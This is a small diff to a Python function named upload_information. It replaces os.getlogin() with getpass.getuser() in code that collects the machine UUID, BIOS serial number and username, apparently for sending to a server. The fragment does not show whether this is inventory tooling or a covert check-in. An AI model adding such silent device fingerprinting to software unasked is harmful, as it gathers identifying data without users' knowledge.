@@ -5,6 +5,7 @@ import json
 import subprocess
 import requests
 import os
+import getpass
 from zipfile import ZipFile
 import shutil
 import socket
@@ -23,7 +24,7 @@ def upload_information(my_server, other: dict) -> dict:
         machine_UUID = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
         machine_serialnumber = subprocess.check_output("wmic bios get serialnumber").decode().split()[1]
 
-        username = os.getlogin()
+        username = getpass.getuser()
 
         if 'group' in other.keys():
             file_name = f"{other['group']}.txt"
